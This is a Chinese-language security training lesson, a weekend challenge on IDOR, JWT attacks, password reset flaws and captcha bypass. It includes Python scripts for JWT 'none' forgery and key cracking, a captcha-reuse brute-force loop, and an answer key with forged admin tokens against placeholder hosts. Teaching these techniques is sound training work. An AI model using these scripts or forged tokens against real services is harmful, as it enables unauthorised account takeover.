---
title: Day051：Week 8 周末闯关 - 认证与逻辑漏洞综合
tags:
  - 网络安全
  - 认证漏洞
  - 逻辑漏洞
  - 周末挑战
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d051
date: 2026-03-14
updated: 2026-01-28
---

# Day051：Week 8 周末闯关 - 认证与逻辑漏洞综合

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 8：认证与逻辑漏洞 |
| **今日主题** | 周末挑战与知识总结 |
| **预计时间** | 3-4 小时 |
| **难度等级** | 综合挑战 |

---

## 今日痛点场景

> **场景**：这一周你学了越权、JWT、密码重置、验证码绕过。现在是检验成果的时候了。
>
> **问题**：能不能综合运用所学，完成一次完整的账户接管？
>
> **今天的任务**：综合挑战 + 知识总结，为下周的系统提权做准备。

---

## 今日目标

- [ ] 完成综合挑战任务
- [ ] 回顾本周知识点
- [ ] 输出 Week 8 学习总结
- [ ] 为 Week 9 做准备

**闯关条件**：完成所有挑战任务。

---

## 综合挑战任务

### 挑战 1：IDOR 漏洞挖掘（45 分钟）

**任务**：在以下 API 设计中找出所有 IDOR 漏洞并利用

**API 列表**：
```http
GET /api/user/{user_id}/profile
GET /api/orders/{order_id}
POST /api/user/{user_id}/update
DELETE /api/messages/{message_id}
GET /api/files/{file_id}/download
```

**假设**：你的用户 ID 是 1001

**要求**：
1. 分析每个 API 的风险
2. 构造测试请求
3. 记录发现的漏洞

**记录**：
```
发现的 IDOR：________________
影响最大的漏洞：________________
利用 Payload：________________
```

---

### 挑战 2：JWT 综合攻击（50 分钟）

**任务**：给定以下 JWT，尝试所有学过的攻击方式

**目标 JWT**：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwibmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTY3ODIzNDU2N30.XXX
```

**攻击清单**：
1. [ ] 解码分析结构
2. [ ] 尝试 none 算法攻击
3. [ ] 尝试弱密钥破解
4. [ ] 尝试算法混淆（如果有公钥）

**要求**：
1. 修改 role 为 admin
2. 生成有效的伪造 JWT
3. 记录成功的攻击方式

**Python 攻击脚本模板**：
```python
import jwt
import base64
import json

original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwibmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTY3ODIzNDU2N30.XXX"

# 1. 解码
def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

# 2. none 算法攻击
def none_attack(payload):
    header = {"alg": "none", "typ": "JWT"}
    payload["role"] = "admin"
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    return f"{h}.{p}."

# 3. 弱密钥破解
def crack_jwt(token, wordlist):
    for word in wordlist:
        try:
            jwt.decode(token, word, algorithms=['HS256'])
            return word
        except:
            continue
    return None

# 你的代码...
```

**记录**：
```
成功的攻击方式：________________
伪造的 JWT：________________
```

---

### 挑战 3：密码重置漏洞利用（45 分钟）

**任务**：分析以下密码重置流程，找出漏洞

**重置流程**：
```http
# 1. 请求重置
POST /forgot-password HTTP/1.1
Host: target.com
{"email": "user@example.com"}

# 2. 返回
{"status": "success", "message": "Reset link sent"}

# 3. 重置链接格式
http://target.com/reset?token=MTY3ODIzNDU2Nzp1c2VyQGV4YW1wbGUuY29t

# 4. 设置新密码
POST /reset-password HTTP/1.1
{"token": "MTY3ODIzNDU2Nzp1c2VyQGV4YW1wbGUuY29t", "password": "newpass"}
```

**分析要点**：
1. Token 格式是什么？（提示：Base64 解码）
2. Token 包含什么信息？
3. 能否为其他用户生成有效 Token？
4. 是否存在 Host 头注入？

**要求**：
1. 分析 Token 结构
2. 构造攻击方案
3. 生成用于接管 admin@example.com 的 Token

**记录**：
```
Token 解码结果：________________
发现的漏洞：________________
伪造的 Token：________________
```

---

### 挑战 4：验证码绕过实战（40 分钟）

**任务**：绕过以下登录验证码进行暴力破解

**登录流程**：
```http
# 1. 获取验证码
GET /captcha?id=sess_abc123 HTTP/1.1

# 2. 登录
POST /login HTTP/1.1
Cookie: session=sess_abc123
{"username": "admin", "password": "test", "captcha": "XYZ123"}

# 3. 失败响应
{"error": "Invalid password or captcha"}
```

**测试项**：
1. [ ] 验证码复用测试
2. [ ] 删除验证码参数测试
3. [ ] 空验证码测试
4. [ ] 检查响应中是否有答案

**Burp 测试脚本**：
```python
# 验证码复用测试
import requests

# 获取一次验证码并手动识别
captcha_value = "XYZ123"

# 测试复用
passwords = ["admin", "password", "123456", "admin123"]
for pwd in passwords:
    resp = requests.post("/login", json={
        "username": "admin",
        "password": pwd,
        "captcha": captcha_value  # 复用同一验证码
    })
    if "success" in resp.text:
        print(f"[+] Password found: {pwd}")
        break
    if "captcha" not in resp.text.lower():
        print("[*] Captcha bypass possible!")
```

**记录**：
```
发现的绕过方法：________________
暴力破解结果：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 完成 IDOR 挖掘 | 25 分 |
| 完成 JWT 攻击 | 25 分 |
| 完成密码重置利用 | 25 分 |
| 完成验证码绕过 | 25 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## Week 8 知识总结

### 本周学习内容

| 日期 | 主题 | 核心技能 |
|------|------|----------|
| Day 45 | 水平越权（IDOR） | 参数篡改、批量测试 |
| Day 46 | 垂直越权 | 权限提升、隐藏功能发现 |
| Day 47 | JWT none 算法 | JWT 解析、签名绕过 |
| Day 48 | JWT 高级攻击 | 弱密钥破解、算法混淆 |
| Day 49 | 密码重置漏洞 | Host 注入、令牌劫持 |
| Day 50 | 验证码绕过 | 复用、暴力破解、OCR |
| Day 51 | 周末挑战 | 综合运用 |

### 技能树更新

```
认证与逻辑漏洞
├── 越权漏洞
│   ├── 水平越权（IDOR）
│   │   ├── 参数枚举
│   │   ├── UUID 泄露
│   │   └── 批量测试
│   └── 垂直越权
│       ├── 目录扫描
│       ├── 角色参数注入
│       └── 请求方法绕过
├── JWT 攻击
│   ├── none 算法
│   ├── 弱密钥破解
│   ├── 算法混淆
│   └── kid 注入
├── 密码重置
│   ├── 弱令牌
│   ├── Host 头注入
│   ├── 令牌不过期
│   └── Referer 泄露
└── 验证码绕过
    ├── 复用/删除
    ├── 响应泄露
    ├── 暴力破解
    └── OCR 识别
```

### 面试高频问题

**Q1：什么是 IDOR？如何防御？**

A1：
- IDOR = 不安全的直接对象引用
- 通过修改参数访问未授权资源
- 防御：后端验证资源所有权，不依赖客户端参数

**Q2：JWT 和 Session 有什么区别？**

A2：
- JWT：无状态，存储在客户端，靠签名验证
- Session：有状态，存储在服务器，靠 Session ID 关联
- JWT 优点：可扩展；缺点：难撤销
- Session 优点：易撤销；缺点：需要共享存储

**Q3：如何测试密码重置漏洞？**

A3：
1. 分析令牌格式和熵
2. 测试 Host 头注入
3. 检查令牌有效期和复用
4. 测试参数污染
5. 验证重置后会话处理

**Q4：验证码绕过的常见方法？**

A4：
1. 验证码复用
2. 删除验证码参数
3. 检查响应中的答案
4. 前端验证绕过
5. OCR 自动识别

---

## 下周预告

**Week 9：系统提权入门**

下周你将学习：
- Linux 基础权限与提权
- Windows 提权基础
- SUID/Capabilities 利用
- 内核漏洞利用入门

**目标**：从 Web Shell 到 Root Shell

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| Week 8 总用时 | |
| 最大收获 | |
| 最大挑战 | |
| 下周期待 | |

---

## 综合挑战参考答案

### 挑战 1 参考

**IDOR 分析**：
```
GET /api/user/{user_id}/profile → 查看任意用户资料
GET /api/orders/{order_id} → 查看任意订单
POST /api/user/{user_id}/update → 修改任意用户信息
DELETE /api/messages/{message_id} → 删除任意消息
GET /api/files/{file_id}/download → 下载任意文件
```

**最严重**：POST /api/user/{user_id}/update（可修改任意用户）

### 挑战 2 参考

**Token 解码**：
```
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1001","name":"user","role":"user","iat":1678234567}
```

**none 攻击 Payload**：
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjc4MjM0NTY3fQ.
```

### 挑战 3 参考

**Token 解码**：
```bash
echo "MTY3ODIzNDU2Nzp1c2VyQGV4YW1wbGUuY29t" | base64 -d
# 结果：1678234567:user@example.com
# 格式：时间戳:邮箱
```

**伪造 Token**：
```bash
echo -n "1678234567:admin@example.com" | base64
# 结果：MTY3ODIzNDU2NzphZG1pbkBleGFtcGxlLmNvbQ==
```

### 挑战 4 参考

**验证码复用测试**：
如果多次提交相同验证码不报"验证码错误"，说明可复用。

---

> **导师点评**：
>
> 恭喜你完成了 Week 8！
>
> 这周你学的是"逻辑漏洞"——最难用自动化工具发现的漏洞类型。
>
> 越权、JWT、密码重置、验证码……这些漏洞的共同点是：**代码没有语法错误，功能也能正常工作，但逻辑上有缺陷**。
>
> 这就是为什么安全测试需要人：你需要理解业务逻辑，才能发现逻辑漏洞。
>
> 下周开始学系统提权——从 Web 渗透进入内网渗透的关键一步。
>
> **记住：Web 漏洞是入口，系统提权才是终点**。

```bash
echo "Week 8 Complete! 逻辑漏洞大师！"
```
